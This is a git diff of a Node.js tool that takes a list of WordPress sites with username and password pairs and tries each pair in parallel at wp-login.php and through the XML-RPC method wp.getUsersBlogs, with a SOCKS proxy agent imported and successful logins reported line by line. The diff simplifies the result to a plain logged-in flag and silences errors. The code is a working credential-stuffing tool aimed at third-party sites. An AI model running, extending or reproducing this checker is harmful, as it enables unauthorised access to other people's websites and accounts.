@@ -8,14 +8,12 @@ const util = require('util');
 const xmlrpc = require('@0xengine/xmlrpc');
 const qs = require('node:querystring');
 const {SocksProxyAgent} = require('socks-proxy-agent');
-const LanguageDetect = require('languagedetect');
-const langDetector = new LanguageDetect();
 
 const DefaultNReq = 10;
 const DefaultFrom = 0;
 
-const RequestTimeout = 20000;
-
+const RequestTimeout = 60000; // 1 min 
+ 
 function rpcTimeout(ms) {
 	return new Promise((resolve)=>{
 		setTimeout(()=>resolve(new Error), ms)
@@ -67,14 +65,10 @@ async function wpLogin(host, protocol, username, password) {
 		pwd: password,
 		testcookie: '1',
 		'wp-submit': 'Log In',
-		//redirect_to: `${protocol}//${host}/wp-admin`
+		redirect_to: `${protocol}//${host}/wp-admin`
 	});
 	
-	const result = {
-		usernameOk: false,
-		passwordOk: false,
-		loggedIn: false
-	};
+	let loggedIn = false;
 	const url = `${protocol}//${host}/wp-login.php`;
 	
 	try { 
@@ -95,27 +89,17 @@ async function wpLogin(host, protocol, username, password) {
 			}
 		);
 		
-		console.log(`url: ${url} status: ${response.status}`)
+		// console.log(`url: ${url} status: ${response.status}`)
 		if (response.status === 200) {
-			console.log(`url: ${url}, lang: ${langDetector.detect(response.data)[0][0]}`);
-			const reNoUser = new RegExp(`The username <strong>${username}</strong> is not registered on this site`); // will give false OK if non-english language is used
-			const usernameIsNotRegistered = response.data.match(reNoUser) !== null;
-			//console.log(`username not registered: ${usernameIsNotRegistered}`);
-			const reInvalidPass = new RegExp(`The password you entered for the username <strong>${username}</strong> is incorrect`); // will give false OK if non-english language is used
-			const passwordIsInvalid = response.data.match(reInvalidPass) !== null;
-			//console.log(`password is invalid: ${passwordIsInvalid}`);
 			const {headers} = response;
-			const loggedIn = headers['set-cookie'] !== undefined && headers['set-cookie'].find(c=>c.match("wordpress_logged_in")) !== undefined;
-			result.loggedIn = loggedIn;
-			result.usernameOk = !usernameIsNotRegistered;
-			result.passwordOk = !passwordIsInvalid;
+			loggedIn = headers['set-cookie'] !== undefined && headers['set-cookie'].find(c=>c.match("wordpress_logged_in")) !== undefined;
 		} 
 	} 
 	catch(err) {
-		console.error(err);
+		//console.error(`url:${url}, msg: ${err.message}`);
 	} // if any error occurs  we want to ignore it and return result with all falses
 	
-	return result;
+	return loggedIn;
 }
 
 
@@ -144,6 +128,8 @@ async function run(pathToTargets, from, nParrallelRequests) {
 			const {host, hostname, protocol} = new urlParser.URL(url);
 			wpLoginPromises.push(wpLogin(host, protocol, username, password));
 			
+
+			// Some sites make too many redirects. We combat this in axios with RequestTimeout and xmlrpc client we combat with Promise.race.
 			const xmlClient = createXmlClient(hostname, protocol);
 			const rpcPromise = xmlClient.methodCall('wp.getUsersBlogs', [username, password]).catch(e=>e); // rpc primise
 			const rpcTimeoutPromise = rpcTimeout(RequestTimeout);
@@ -153,13 +139,9 @@ async function run(pathToTargets, from, nParrallelRequests) {
 		// Note: if ERROR 'Unknown tag TITLE' or similar is returned to XMLRPC request that means the /xmlrpc.php page is forbidden.
 		// It's not forbidden by Wordpress but by web server. When XMLRPC is forbidden by Wordpress plugin,
 		// there is XML error.
-		console.log('start login');
+		
 		const wpLoginResults = await Promise.allSettled(wpLoginPromises);
-		console.log('login settled');
-
-		console.log('start blogs');
 		const getUsersBlogsResults = await Promise.allSettled(getUsersBlogsPromises);
-		console.log('user blogs settled');
 
 		for (let j=0; j<wpLoginResults.length; j++) {
 			const k = i*nParrallelRequests + j;
@@ -167,7 +149,7 @@ async function run(pathToTargets, from, nParrallelRequests) {
 			const wpLoginResult = wpLoginResults[j].value;
 			
 			const xmlLoginResult = !(getUsersBlogsResults[j].value instanceof Error) && getUsersBlogsResults[j].value.errno === undefined
-			const report = `login|${line}|${wpLoginResult.usernameOk}|${wpLoginResult.passwordOk}|${wpLoginResult.loggedIn}|${xmlLoginResult}`;
+			const report = `login|${line}|${wpLoginResult}|${xmlLoginResult}`;
 			console.log(report);
 		}
 
